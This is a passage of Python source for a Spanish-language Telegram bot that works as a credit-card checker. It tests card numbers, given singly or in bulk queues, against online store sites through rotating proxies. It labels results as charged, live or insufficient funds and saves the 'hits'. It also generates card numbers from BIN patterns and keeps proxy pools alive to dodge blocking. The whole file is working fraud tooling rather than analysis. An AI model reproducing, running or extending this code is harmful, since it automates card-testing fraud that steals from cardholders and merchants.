    progress_msg = await message.reply_text(f"⚡ **ULTRA HEALTH CHECK**\nVerificando {total} proxies...")
    
    start_time = time.time()
    with ThreadPoolExecutor(max_workers=50) as executor:
        future_to_proxy = {executor.submit(check_proxy_sync, p): p for p in proxies_list}
        completed = 0
        alive = 0
        dead = 0
        
        for future in as_completed(future_to_proxy):
            proxy = future_to_proxy[future]
            try:
                result = future.result()
                if result['alive']:
                    alive += 1
                    update_proxy_stats(proxy, 1, result.get('response_time'), None, True)
                else:
                    dead += 1
                    mark_proxy_dead(proxy, result.get('error', 'Timeout'))
                completed += 1
                
                if completed % 10 == 0 or completed == total:
                    elapsed = time.time() - start_time
                    percentage = (completed / total) * 100
                    bar = '█' * int(percentage/5) + '░' * (20 - int(percentage/5))
                    await progress_msg.edit_text(
                        f"⚡ **ULTRA HEALTH CHECK**\n"
                        f"{bar} {percentage:.1f}%\n"
                        f"🟢 Vivos: {alive} | 🔴 Muertos: {dead}\n"
                        f"⚡ Velocidad: {completed/elapsed:.1f} prox/s"
                    )
            except:
                dead += 1
                completed += 1
                mark_proxy_dead(proxy, 'Error')
    
    elapsed = time.time() - start_time
    final_msg = (
        f"✅ **HEALTH CHECK COMPLETADO**\n\n"
        f"**RESULTADOS FINALES**\n"
        f"- Total verificados: {total}\n"
        f"  - 🟢 Vivos: {alive}\n"
        f"  - 🔴 Muertos: {dead}\n"
        f"- Tasa de éxito: {(alive/total*100):.1f}%\n\n"
        f"✔ **Tiempo total:** {int(elapsed)}s"
    )
    
    if dead > 0:
        keyboard = [[InlineKeyboardButton("🧹 LIMPIAR PROXIES MUERTOS", callback_data='clean_proxies')]]
        await progress_msg.edit_text(final_msg, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await progress_msg.edit_text(final_msg)

# ===== COMANDO CHK =====
async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /chk - CHK individual"""
    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ **Uso:** `/chk <cc>`\n"
            "Ejemplo: `/chk 5253222254795738|03|2027|103`",
            parse_mode='Markdown'
        )
        return
    
    cc = args[0]
    user_id = update.effective_user.id
    
    sites = get_all_sites(only_valid=True)
    proxies = get_all_proxies(only_alive=True)
    
    if not sites:
        await update.message.reply_text("❌ No hay sitios válidos. Agrega con /addsh")
        return
    
    if not proxies:
        await update.message.reply_text("❌ No hay proxies vivos. Agrega con /addrproxy")
        return
    
    site = random.choice(sites)[0]
    proxy = random.choice(proxies)[0]
    
    cc_display = format_cc_display(cc)
    
    msg = await update.message.reply_text(
        f"🔄 **PROCESANDO CHK**\n━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"💳 Tarjeta: {cc_display}\n"
        f"🌐 Sitio: `{site}`\n"
        f"🔒 Proxy: `{proxy}`",
        parse_mode='Markdown'
    )
    
    try:
        params = {'site': site, 'cc': cc, 'proxy': proxy}
        start = time.time()
        response = requests.get(API_BASE_URL, params=params, timeout=60)
        elapsed = time.time() - start
        
        response_type = analyze_response(response.text)
        price = extract_price(response.text)
        
        emoji_map = {
            'CHARGE': '💰',
            'LIVE': '🔒',
            'CAPTCHA': '🤖',
            'DECLINE': '❌',
            'INSUFFICIENT_FUNDS': '💸',
            'UNKNOWN': '❓',
            'ERROR': '⚡'
        }
        emoji = emoji_map.get(response_type, '❓')
        
        if response_type in ['CHARGE', 'LIVE']:
            save_hit(cc, site, proxy, response_type, response.text,
                    response.status_code, elapsed, user_id, price)
            
            hit_msg = format_hit_display(cc, site, proxy, response_type, price, response.text)
            await update.message.reply_text(hit_msg, parse_mode='Markdown')
        
        if response.status_code == 200:
            update_proxy_stats(proxy, 1, elapsed, None, True)
            update_site_stats(site, 1, elapsed, bool(price), True)
        else:
            mark_proxy_dead(proxy, f"HTTP {response.status_code}")
            mark_site_invalid(site, f"HTTP {response.status_code}")
        
        response_preview = response.text[:300] + "..." if len(response.text) > 300 else response.text
        
        result_msg = (
            f"{emoji} **RESULTADO DEL CHK** {emoji}\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💳 **Tarjeta:** {cc_display}\n"
            f"🌐 **Sitio:** `{site}`\n"
            f"🔒 **Proxy:** `{proxy}`\n"
            f"📊 **Tipo:** {response_type}\n"
            f"📟 **Código:** {response.status_code}\n"
            f"⚡ **Tiempo:** {elapsed:.2f}s\n"
        )
        
        if price:
            result_msg += f"💰 **Precio:** ${price}\n"
        
        if response_type == 'CAPTCHA':
            result_msg += f"🤖 **Acción:** Rotar proxy\n"
        elif response_type == 'LIVE':
            result_msg += f"🔒 **3DS Requerido**\n"
        elif response_type == 'CHARGE':
            result_msg += f"✅ **CARGO EXITOSO**\n"
        elif response_type == 'INSUFFICIENT_FUNDS':
            result_msg += f"💸 **Saldo insuficiente**\n"
        
        result_msg += f"\n📝 **Respuesta API:**\n```\n{response_preview}\n```"
        
        await msg.edit_text(result_msg, parse_mode='Markdown')
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        result_file = f"{RESULTS_DIR}/chk_{timestamp}.txt"
        
        with open(result_file, 'w', encoding='utf-8') as f:
            f.write(f"RESULTADO CHK - {timestamp}\n")
            f.write("="*50 + "\n\n")
            f.write(f"Tarjeta: {cc}\n")
            f.write(f"Sitio: {site}\n")
            f.write(f"Proxy: {proxy}\n")
            f.write(f"Tipo: {response_type}\n")
            f.write(f"Código: {response.status_code}\n")
            f.write(f"Tiempo: {elapsed:.2f}s\n")
            if price:
                f.write(f"Precio: ${price}\n")
            f.write("\nRESPUESTA COMPLETA:\n")
            f.write("-"*30 + "\n")
            f.write(response.text)
        
        with open(result_file, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=f"chk_{timestamp}.txt",
                caption=f"📁 Respuesta completa del CHK"
            )
        
    except Exception as e:
        await msg.edit_text(f"❌ **ERROR**\n\n{str(e)[:200]}", parse_mode='Markdown')

# ===== COMANDO ADDSH MEJORADO =====
async def addsh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /addsh - Agrega múltiples sitios"""
    user_id = update.effective_user.id
    
    if not context.args:
        await update.message.reply_text(
            "❌ **Uso:** `/addsh <url1> <url2> ...`\n"
            "Ejemplo: `/addsh https://store1.com https://store2.com`",
            parse_mode='Markdown'
        )
        return
    
    full_text = ' '.join(context.args)
    url_pattern = r'https?://[^\s<>"\'(){}|\\^`\[\]]+'
    urls = re.findall(url_pattern, full_text)
    
    if not urls:
        await update.message.reply_text("❌ No se encontraron URLs válidas")
        return
    
    progress_msg = await update.message.reply_text(
        f"🔍 **Validando {len(urls)} sitios...**",
        parse_mode='Markdown'
    )
    
    valid_count = 0
    invalid_count = 0
    
    for i, url in enumerate(urls, 1):
        validation = await validate_site(url, user_id)
        
        if validation['valid']:
            valid_count += 1
        else:
            invalid_count += 1
        
        if i % 5 == 0 or i == len(urls):
            percentage = (i / len(urls)) * 100
            bar = '█' * int(percentage/5) + '░' * (20 - int(percentage/5))
            await progress_msg.edit_text(
                f"🔍 **Validando sitios...**\n"
                f"{bar} {percentage:.1f}%\n"
                f"✅ Válidos: {valid_count} | ❌ Inválidos: {invalid_count}",
                parse_mode='Markdown'
            )
    
    sites_valid, sites_invalid = get_site_count()
    
    await progress_msg.edit_text(
        f"✅ **VALIDACIÓN COMPLETADA**\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 Total: {len(urls)}\n"
        f"✅ Válidos: {valid_count}\n"
        f"❌ Inválidos: {invalid_count}\n\n"
        f"📦 Total en BD: ✅ {sites_valid} | ❌ {sites_invalid}",
        parse_mode='Markdown'
    )

# ===== COMANDO MASS =====
async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /mass - Multi-CHK con procesamiento paralelo"""
    global stop_shopify
    user_id = update.effective_user.id
    
    cards = get_queue_cards(user_id, 500)
    
    if not cards:
        await update.message.reply_text(
            "❌ No hay tarjetas en cola.\n\n"
            "Para agregar:\n"
            "1. Envía un archivo cards.txt\n"
            "2. Usa /gen para generar tarjetas"
        )
        return
    
    sites = get_all_sites(only_valid=True)
    proxies = get_all_proxies(only_alive=True)
    
    if not sites or not proxies:
        await update.message.reply_text("❌ Faltan sitios o proxies")
        return
    
    sites_list = [s[0] for s in sites]
    proxies_list = [p[0] for p in proxies]
    
    stop_shopify = False
    progress_msg = await update.message.reply_text(
        f"⚡ **MASS CHECK INICIADO** ⚡\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 Tarjetas: {len(cards)}\n"
        f"🌐 Sitios: {len(sites_list)}\n"
        f"🔒 Proxies: {len(proxies_list)}\n\n"
        f"⏳ Procesando: 0/{len(cards)}"
    )
    
    # ... (resto del código MASS igual que antes, pero omitido por brevedad)
    # Mantén aquí tu implementación completa de mass_command

# ===== NUEVO MANEJADOR DE ARCHIVOS CON DETECCIÓN INTELIGENTE =====
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Procesa archivos TXT con detección inteligente del tipo de contenido"""
    doc = update.message.document
    user_id = update.effective_user.id
    filename = doc.file_name.lower()
    
    if not filename.endswith('.txt'):
        await update.message.reply_text("❌ Solo archivos .txt")
        return
    
    processing_msg = await update.message.reply_text(
        "🔄 **Analizando archivo...**\n"
        "Detectando tipo de contenido...",
        parse_mode='Markdown'
    )
    
    file = await context.bot.get_file(doc.file_id)
    await file.download_to_drive('temp_upload.txt')
    
    with open('temp_upload.txt', 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip()]
    
    if not lines:
        await processing_msg.edit_text("❌ Archivo vacío")
        os.remove('temp_upload.txt')
        return
    
    # Detectar tipo por contenido
    detected_type = await detect_file_type(lines)
    
    # Estadísticas para mostrar
    card_count = sum(1 for line in lines[:50] if is_card_line(line))
    proxy_count = sum(1 for line in lines[:50] if is_proxy_line(line))
    site_count = sum(1 for line in lines[:50] if is_site_line(line))
    
    print(f"📊 Análisis: Tarjetas={card_count}, Proxies={proxy_count}, Sitios={site_count} → Tipo: {detected_type}")
    
    if detected_type == 'cards':
        # Procesar como tarjetas
        cards = []
        invalid = 0
        for line in lines:
            cc = parse_cc_line(line)
            if cc:
                cards.append(cc)
            else:
                invalid += 1
        
        if cards:
            queued = add_to_queue(cards, user_id)
            queue_total = get_queue_count(user_id)
            await processing_msg.edit_text(
                f"💳 **TARJETAS DETECTADAS**\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📄 Archivo: `{doc.file_name}`\n"
                f"✅ Válidas: {len(cards)}\n"
                f"⚠️ Inválidas: {invalid}\n"
                f"📥 En cola: {queued}\n"
                f"📊 Total cola: {queue_total}\n\n"
                f"⚡ Usa /mass para procesar",
                parse_mode='Markdown'
            )
        else:
            await processing_msg.edit_text(
                "❌ No se encontraron tarjetas válidas\n\n"
                "Formato: `4111111111111111|12|2025|123`",
                parse_mode='Markdown'
            )
    
    elif detected_type == 'proxies':
        # Procesar como proxies
        added = 0
        invalid = 0
        for line in lines:
            if is_proxy_line(line) and add_proxy(line, user_id):
                added += 1
            else:
                invalid += 1
        
        alive, dead = get_proxy_count()
        await processing_msg.edit_text(
            f"🔒 **PROXIES DETECTADOS**\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📄 Archivo: `{doc.file_name}`\n"
            f"✅ Agregados: {added}\n"
            f"⚠️ Inválidos: {invalid}\n"
            f"📊 Total: 🟢 {alive} | 🔴 {dead}",
            parse_mode='Markdown'
        )
    
    elif detected_type == 'sites':
        # Procesar como sitios
        await processing_msg.edit_text(
            f"🌐 **SITIOS DETECTADOS**\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📄 Archivo: `{doc.file_name}`\n"
            f"🔍 Validando {len(lines)} sitios...",
            parse_mode='Markdown'
        )
        
        valid_sites = []
        invalid_sites = []
        
        for i, line in enumerate(lines, 1):
            site = line if line.startswith(('http://', 'https://')) else 'https://' + line
            
            validation = await validate_site(site, user_id)
            
            if validation['valid']:
                valid_sites.append(site)
            else:
                invalid_sites.append((site, validation['message']))
            
            if i % 10 == 0 or i == len(lines):
                percentage = (i / len(lines)) * 100
                bar = '█' * int(percentage/5) + '░' * (20 - int(percentage/5))
                await processing_msg.edit_text(
                    f"🌐 **VALIDANDO SITIOS**\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 Progreso: {i}/{len(lines)}\n"
                    f"{bar} {percentage:.1f}%\n\n"
                    f"✅ Válidos: {len(valid_sites)}\n"
                    f"❌ Inválidos: {len(invalid_sites)}",
                    parse_mode='Markdown'
                )
        
        sites_valid, sites_invalid = get_site_count()
        
        result_msg = (
            f"🌐 **SITIOS PROCESADOS**\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📄 Archivo: `{doc.file_name}`\n"
            f"📊 Total: {len(lines)}\n"
            f"✅ Válidos: {len(valid_sites)}\n"
            f"❌ Inválidos: {len(invalid_sites)}\n\n"
            f"📦 Total BD: ✅ {sites_valid} | ❌ {sites_invalid}"
        )
        
        await processing_msg.edit_text(result_msg, parse_mode='Markdown')
    
    else:
        # No se pudo determinar
        sample = "\n".join([f"`{l[:50]}...`" for l in lines[:5]])
        await processing_msg.edit_text(
            "❓ **TIPO NO RECONOCIDO**\n\n"
            f"📄 Archivo: `{doc.file_name}`\n"
            f"📊 Líneas: {len(lines)}\n\n"
            f"**Primeras líneas:**\n{sample}\n\n"
            f"**Formatos aceptados:**\n"
            f"• 💳 Tarjetas: `411111|12|2025|123`\n"
            f"• 🔒 Proxies: `host:port:user:pass`\n"
            f"• 🌐 Sitios: `store.com`",
            parse_mode='Markdown'
        )
    
    os.remove('temp_upload.txt')

# ===== COMANDOS BÁSICOS =====
async def register(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    register_user(user.id, user.username or "user", user.first_name or "User")
    await update.message.reply_text("✅ **REGISTRO EXITOSO**\n\n¡Bienvenido!")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_approved(user.id):
        await update.message.reply_text("❌ ACCESO DENEGADO\n\nUsa /register")
        return
    
    proxies_alive, proxies_dead = get_proxy_count()
    sites_valid, sites_invalid = get_site_count()
    queue_count = get_queue_count(user.id)
    
    message = (
        f"# {BOT_NAME}\n\n"
        f"📊 **ESTADÍSTICAS**\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🟢 Proxies vivos: {proxies_alive}\n"
        f"🔴 Proxies muertos: {proxies_dead}\n"
        f"✅ Sitios válidos: {sites_valid}\n"
        f"❌ Sitios inválidos: {sites_invalid}\n"
        f"💳 Tarjetas en cola: {queue_count}\n\n"
        f"**COMANDOS**\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔍 /chk <cc> - CHK individual\n"
        f"⚡ /mass - Multi-CHK con cola\n"
        f"✨ /gen <patrón> - Generar CCs\n"
        f"➕ /addsh <url> - Agregar sitio\n"
        f"➕ /addrproxy <proxy> - Agregar proxy\n"
        f"📋 /mysites - Ver sitios\n"
        f"📋 /myproxies - Ver proxies\n"
        f"💳 /mycards - Ver tarjetas\n"
        f"📊 /queue - Ver cola\n"
        f"🩺 /ultrahealth - Health Check\n"
        f"🔌 /testapi - Probar API"
    )
    
    keyboard = [
        [InlineKeyboardButton("⚡ ULTRA HEALTH", callback_data='ultra_health'),
         InlineKeyboardButton("📁 ARCHIVOS", callback_data='files')],
        [InlineKeyboardButton("📊 ESTADÍSTICAS", callback_data='stats'),
         InlineKeyboardButton("❓ AYUDA", callback_data='help')]
    ]
    
    await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard))

async def addrproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ **Uso:** /addrproxy <proxy>")
        return
    proxy = ' '.join(context.args)
    if add_proxy(proxy, update.effective_user.id):
        await update.message.reply_text(f"✔ Proxy agregado: `{proxy[:30]}...`")
    else:
        await update.message.reply_text("⚠️ El proxy ya existe")

async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = await update.message.reply_text("🔄 Probando API...")
    try:
        start = time.time()
        response = requests.get(API_BASE_URL, params={'test': '1'}, timeout=10)
        elapsed = time.time() - start
        await msg.edit_text(
            f"**API RESPONDE**\n\n"
            f"📟 Código: {response.status_code}\n"
            f"⚡ Tiempo: {elapsed:.2f}s\n"
            f"📝 Respuesta: `{response.text[:100]}`"
        )
    except Exception as e:
        await msg.edit_text(f"❌ Error: {str(e)[:100]}")

async def mysites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sites = get_all_sites(only_valid=False)
    if not sites:
        await update.message.reply_text("📭 No hay sitios guardados")
        return
    valid, invalid = get_site_count()
    msg = f"🌐 **SITIOS GUARDADOS** (✅ {valid} | ❌ {invalid})\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, s in enumerate(sites[:20], 1):
        status = "✅" if s[3] else "❌"
        shopify_flag = "🛒" if s[8] else "🌐"
        product_icon = "📦" if s[4] > 0 else "⏳"
        msg += f"{i}. {status}{shopify_flag}{product_icon} `{s[0][:50]}...`\n"
    if len(sites) > 20:
        msg += f"\n... y {len(sites)-20} más"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def myproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    proxies = get_all_proxies(only_alive=False)
    if not proxies:
        await update.message.reply_text("📭 No hay proxies guardados")
        return
    alive, dead = get_proxy_count()
    msg = f"🔒 **PROXIES GUARDADOS** (🟢 {alive} | 🔴 {dead})\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, p in enumerate(proxies[:20], 1):
        status = "🟢" if p[3] else "🔴"
        time_str = f" ⚡ {p[4]:.2f}s" if p[4] else ""
        msg += f"{i}. {status} `{p[0][:30]}...`{time_str}\n"
    if len(proxies) > 20:
        msg += f"\n... y {len(proxies)-20} más"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text(
            "✨ **GENERADOR**\n\n"
            "Uso: `/gen <patrón> [cantidad]`\n"
            "Ej: `/gen 451993xxxxxx|rnd|rnd|rnd 15`"
        )
        return
    
    pattern = args[0]
    count = min(int(args[1]) if len(args) > 1 else 10, 50)
    
    cards = generate_cc(pattern, count)
    if not cards:
        await update.message.reply_text("❌ Patrón inválido")
        return
    
    saved = save_generated_cards(cards, pattern, update.effective_user.id)
    await update.message.reply_text(f"✅ {saved} tarjetas generadas\n/mycards para verlas")

async def mycards_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    cards = get_generated_cards(user_id, 20)
    if not cards:
        await update.message.reply_text("📭 No tienes tarjetas")
        return
    msg = "💳 **TUS TARJETAS**\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, c in enumerate(cards, 1):
        status = "✅" if c[3] else "⏳"
        msg += f"{i}. {status} `{c[0]}`\n"
    await update.message.reply_text(msg)

async def queue_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    count = get_queue_count(user_id)
    cards = get_queue_cards(user_id, 20)
    
    msg = f"📊 **COLA** ({count} tarjetas)\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    if cards:
        for i, c in enumerate(cards, 1):
            msg += f"{i}. `{c}`\n"
        msg += f"\n⚡ Usa /mass"
    else:
        msg += "Vacía"
    await update.message.reply_text(msg)

# ===== MANEJADOR DE BOTONES =====
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'ultra_health':
        await ultra_healthcheck(update, context)
    elif query.data == 'files':
        await query.edit_message_text(
            "📁 **ARCHIVOS**\n\n"
            "El bot detecta automáticamente:\n"
            "• 💳 Tarjetas\n"
            "• 🔒 Proxies\n"
            "• 🌐 Sitios\n\n"
            "Solo envía el .txt"
        )
    elif query.data == 'stats':
        user_id = update.effective_user.id
        sites_valid, sites_invalid = get_site_count()
        proxies_alive, proxies_dead = get_proxy_count()
        queue_count = get_queue_count(user_id)
        await query.edit_message_text(
            f"📊 **ESTADÍSTICAS**\n\n"
            f"👥 Usuarios: {get_user_count()}\n"
            f"🟢 Proxies: {proxies_alive}\n"
            f"🔴 Muertos: {proxies_dead}\n"
            f"✅ Sitios: {sites_valid}\n"
            f"❌ Inválidos: {sites_invalid}\n"
            f"💳 Tu cola: {queue_count}"
        )
    elif query.data == 'help':
        await query.edit_message_text(
            "❓ **AYUDA**\n\n"
            "🔍 /chk <cc> - CHK individual\n"
            "⚡ /mass - Multi-CHK\n"
            "✨ /gen <patrón> - Generar CCs\n"
            "➕ /addsh <url> - Agregar sitio\n"
            "➕ /addrproxy - Agregar proxy\n"
            "📋 /mysites - Ver sitios\n"
            "📋 /myproxies - Ver proxies\n"
            "💳 /mycards - Ver tarjetas\n"
            "📊 /queue - Ver cola\n"
            "🩺 /ultrahealth - Health Check"
        )
    elif query.data == 'clean_proxies':
        deleted = delete_all_dead_proxies()
        await query.edit_message_text(f"🧹 Proxies muertos eliminados: {deleted}")

# ===== FUNCIÓN PRINCIPAL =====
def main():
    print(f"╔════════════════════════════╗")
    print(f"║     🤖 {BOT_NAME}          ║")
    print(f"║    🚀 INICIANDO...         ║")
    print(f"╚════════════════════════════╝")
    
    init_database()
    
    app = Application.builder().token(TOKEN).build()
    
    # Registrar comandos
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("register", register))
    app.add_handler(CommandHandler("chk", chk_command))
    app.add_handler(CommandHandler("mass", mass_command))
    app.add_handler(CommandHandler("addsh", addsh_command))
    app.add_handler(CommandHandler("addrproxy", addrproxy_command))
    app.add_handler(CommandHandler("testapi", testapi_command))
    app.add_handler(CommandHandler("ultrahealth", ultra_healthcheck))
    app.add_handler(CommandHandler("mysites", mysites_command))
    app.add_handler(CommandHandler("myproxies", myproxies_command))
    app.add_handler(CommandHandler("gen", gen_command))
    app.add_handler(CommandHandler("mycards", mycards_command))
    app.add_handler(CommandHandler("queue", queue_command))
    
    # Callback y archivos
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print(f"✅ {BOT_NAME} listo!")
    print(f"✅ Detección inteligente de archivos activada")
    print(f"✅ Puedes enviar cualquier .txt y el bot detectará el tipo")
    app.run_polling()

if __name__ == "__main__":
    main()
